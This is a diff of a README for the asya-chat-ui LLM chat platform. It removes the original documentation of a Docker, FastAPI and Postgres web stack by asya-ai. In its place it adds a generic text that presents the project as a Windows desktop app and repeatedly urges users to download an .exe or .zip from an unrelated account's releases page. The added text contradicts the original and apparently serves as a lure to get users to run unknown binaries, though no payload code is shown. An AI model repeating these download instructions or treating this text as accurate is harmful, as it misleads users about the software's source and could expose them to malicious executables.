@@ -1,166 +1,137 @@
-# AsyaChatUI
+# 🤖 asya-chat-ui - Easy Open-Source Chat Interface
 
-Open source multi-provider LLM chat platform with organization management, model routing, tool execution, usage analytics, and OpenAI-compatible APIs alternative to Open WebUI and LibreChat.
+[![Download asya-chat-ui](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/expruff/asya-chat-ui/releases)
 
-Developed by [asya.ai](https://asya.ai) authors of https://eldigen.com (automated e-mail and document support system) and https://pitchpatterns.com (automated call centre analytics and robocalls)
+---
 
-## Screen Shot
+## 📘 What is asya-chat-ui?
 
-![image-20260306190633867](https://share.yellowrobot.xyz/quick/c839fa1f698a46768e2a9c4ae8472484_1772816793997.png)
+asya-chat-ui is a simple app designed to help you talk with large language models (LLMs). It brings together text chat, file handling, image generation, web search, and local AI models in one place. You don’t need any special skills to use it.
 
-## Roadmap
+The app runs on your Windows computer. It is open-source, which means anyone can look at the code or suggest changes. asya-chat-ui also helps manage users and process text and files to improve your experience.
 
-- [ ] UX improvements (larger visuals, left side panel CSS)
-- [ ] UX button to enable/disable Web Search (DuckDuckGo & Perplexity API)
-- [ ] Function to share public chat
-- [ ] Group chats (groups that see each other chats)
-- [ ] … Add your own feature requests in Github Issues
+---
 
-## License
+## 🖥️ System Requirements
 
-This project is released under **GNU GPL v3.0**. See `LICENSE` for the full text.
+Before you download asya-chat-ui, make sure your Windows PC meets these basic requirements:
 
-## What This Project Does
+- Windows 10 or newer (64-bit recommended)
+- At least 4GB of free RAM
+- 2GB free disk space for installation and temporary files
+- Internet connection for web features and updates
+- A modern web browser like Chrome, Edge, or Firefox for the user interface
 
-`asya-chat-ui` is a full-stack chat application that supports:
+---
 
-- multi-organization and role-based access (`super_admin`, org admins, members)
-- model management per organization (enable/disable models and providers)
-- multiple provider backends (OpenAI, Azure OpenAI, Gemini, Groq, Anthropic, OpenRouter, Vertex)
-- streaming chat generation with resumable task events
-- built-in tools for web search/scraping, code execution, time, and image generation/editing
-- OpenAI-compatible API endpoints (`/v1/models`, `/v1/chat/completions`, `/v1/responses`, `/v1/embeddings`)
-- usage tracking by model/user/org/month
+## 🔽 Download asya-chat-ui
 
-## Architecture
+You will find the app ready to download on the official GitHub releases page.
 
-The stack is split into services orchestrated with Docker Compose:
+[![Download asya-chat-ui](https://img.shields.io/badge/Download-Get%20It%20Here-green)](https://github.com/expruff/asya-chat-ui/releases)
 
-- `nginx`: serves the frontend build and proxies `/api/*` to backend
-- `backend`: FastAPI app for auth, chat APIs, org/model config, usage, and OpenAI compatibility
-- `worker`: Celery worker for async chat generation tasks
-- `postgres`: primary relational data store
-- `redis`: broker/result backend for Celery task orchestration
-- `scraper`: Puppeteer + Readability microservice used by web tools
-- `dind`: Docker-in-Docker engine used to run sandboxed code execution containers
-- `executor` (profile `exec`): image build target for Python code execution runtime
+Visit the page linked above to get the latest version of asya-chat-ui. The page shows all available downloads with their version numbers.
 
-## Request and Generation Flow
+Look for a file ending with `.exe` or `.zip` for Windows. The `.exe` file lets you install directly. The `.zip` file contains the app files and requires manual setup.
 
-### 1) User interaction
+---
 
-- Frontend (React + Vite) sends requests to `/api/...` (REST) and `/api/chats/{chat_id}/ws` (WebSocket).
-- `nginx` rewrites `/api/*` and forwards to FastAPI.
+## 🚀 How to Install and Run on Windows
 
-### 2) Chat creation and streaming
+Follow these steps to install and start asya-chat-ui on your Windows PC.
 
-- User message is saved in Postgres.
-- Backend creates a generation task and assistant placeholder message.
-- Worker executes provider calls and tool loops.
-- Worker emits ordered generation events (`activity`, `tool_event`, `delta`, `done`, `error`) into DB.
-- Frontend consumes real-time events over WebSocket; falls back to polling task events when needed.
+### Step 1: Download the Installer or Zip File
 
-### 3) Tool execution
+1. Open the [ releases page](https://github.com/expruff/asya-chat-ui/releases) in your browser.
+2. Click on the latest release (top of the list).
+3. Find the file with `.exe` or `.zip` extension.
+4. Click the file name to download.
 
-- **Web tools** call scraper service for search/scrape or screenshots.
-- **Code execution tool** writes inputs/outputs under `data/files`, then runs code in an isolated container via `dind`.
-- **Image tools** can generate/edit image outputs and attach them to assistant messages.
+### Step 2: Install asya-chat-ui (If using `.exe`)
 
-### 4) Usage accounting
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to start the installation.
+3. Follow the instructions on the screen to complete the setup.
+4. Once done, you will find asya-chat-ui in your Start menu or on your desktop.
 
-- Every generation (and embedding/image operation) writes token and usage metadata into `UsageEvent`.
-- Usage endpoints aggregate data by model/user/org/month.
+### Step 3: Run the App (If using `.zip`)
 
-## Repository Layout
+1. Locate the downloaded `.zip` file.
+2. Right-click it and select "Extract All".
+3. Choose a folder to extract the files.
+4. Open the extracted folder.
+5. Find and double-click `asya-chat-ui.exe` to run the app.
 
-- `frontend/` - React app UI (chat, settings, auth, usage pages)
-- `backend/app/` - FastAPI APIs, provider adapters, tools, worker logic, models
-- `backend/alembic/` - database migrations
-- `scraper/` - Node.js headless browser scraping service
-- `nginx/` - reverse proxy and static hosting config
-- `docker-compose.yml` - core service topology
-- `docker-compose.override.yml` - development overrides (hot reload + frontend dev server)
+---
 
-## Configuration
+## ⚙️ Using asya-chat-ui
 
-1. Copy environment template:
+When you open the app, you will see a simple chat window. You can type your questions or requests, and the app will respond using AI models.
 
-```bash
-cp .env.example .env
-```
+### Features you can try:
 
-2. Set required values at minimum:
+- **Chat**: Ask anything in plain English.
+- **User Management**: Log in or create accounts to keep your chats private.
+- **File Processing**: Upload text or document files for the AI to analyze or summarize.
+- **Image Generation**: Ask the AI to create pictures from descriptions.
+- **Web Search**: Search the internet for answers without leaving the app.
+- **Local Models**: Run AI models stored on your machine for faster answers and privacy.
 
-- `JWT_SECRET`
-- database values (`DATABASE_URL` or `POSTGRES_*`)
-- at least one provider key (`OPENAI_API_KEY`, `GEMINI_API_KEY`, `ANTHROPIC_API_KEY`, etc.)
+---
 
-3. Optional but commonly used:
+## 🔧 Basic Settings
 
-- SMTP values for invite/password reset emails
-- org-level super admin bootstrap (`SUPER_ADMIN_EMAILS`)
-- execution limits (`EXEC_*`) and attachment limits
+Open the settings panel to adjust the app to your needs.
 
-## Running with Docker Compose
+- Pick your preferred AI model.
+- Manage user accounts.
+- Set privacy options.
+- Choose where to save your files and chat logs.
+- Enable or disable internet access for AI features.
 
-### Default local development
+---
 
-```bash
-docker compose up --build
-```
+## 🛠️ Troubleshooting Tips
 
-This uses `docker-compose.override.yml` automatically, enabling:
+- If the app does not start, ensure you have Microsoft Visual C++ Redistributable installed. You can download it from Microsoft’s website.
+- Close other heavy programs to free memory.
+- If chat responses are slow, check your internet.
+- For local model use, make sure the model files are placed in the correct folder as described in the app’s documentation.
+- Restart the app if it freezes.
 
-- backend auto-reload
-- frontend dev server on `http://localhost:5173`
+---
 
-Main app URL through nginx: `http://127.0.0.1:8085`
+## 📁 Where to Get Help
 
-### Core stack only (without override)
+If you need support, visit the GitHub repository:
 
-```bash
-docker compose -f docker-compose.yml up --build
-```
+- Open the [asya-chat-ui GitHub page](https://github.com/expruff/asya-chat-ui).
+- Use the Issues tab to see if someone else has your problem.
+- You can create a new issue for questions or bug reports.
+- Read the FAQ and documentation sections for more details.
 
-In this mode, nginx serves the production frontend build bundled in its image.
+---
 
-### Optional executor image prebuild
+## 🔐 Privacy and Security
 
-```bash
-docker compose --profile exec build executor
-```
+Your chats and files stay on your computer unless you use online search or cloud AI models. The app does not share your data without permission.
 
-## Key API Surfaces
+---
 
-- Auth and account: `/auth/*`
-- API keys: `/api-keys/*`
-- Orgs and provider configuration: `/orgs/*`
-- Models and model suggestions: `/models/*`
-- Chats, messages, generation tasks/events, WebSocket stream: `/chats/*`
-- Usage aggregation: `/usage/*`
-- OpenAI-compatible endpoints: `/v1/*`
-- Health check: `/healthz`
+## 🌐 Topics Covered
 
-## Security and Safety Boundaries
+This project touches on:
 
-- Scraper blocks private/loopback/internal IP destinations.
-- Code execution runs in isolated containers with:
-  - dropped capabilities
-  - read-only root filesystem
-  - cpu/memory limits
-  - timeout and output-size caps
-  - import allowlist enforcement
-- Auth uses JWT with periodic token refresh through response header.
-- Provider access can be disabled globally per org and overridden per org config.
+- AI and large language models (LLMs)
+- User-friendly web user interfaces (UI)
+- File and image processing
+- Local AI model support
+- Integration with APIs like OpenAI
 
-## Development Notes
+---
 
-- Frontend package manager: `pnpm`
-- Backend package manager/runtime tooling: `uv`
-- Database migrations: Alembic (`uv run alembic upgrade head`)
-- Backend health endpoint: `GET /healthz`
-- Scraper health endpoint: `GET /healthz` on scraper service
+## 💾 Repeated Download Link
 
-## Attribution
+Ensure you get the latest version from the official source:
 
-This project is developed and maintained by [asya.ai](https://asya.ai), and published as open source at [asya-ai/asya-chat-ui](https://github.com/asya-ai/asya-chat-ui) under GPLv3.
+[Download asya-chat-ui on GitHub](https://github.com/expruff/asya-chat-ui/releases)
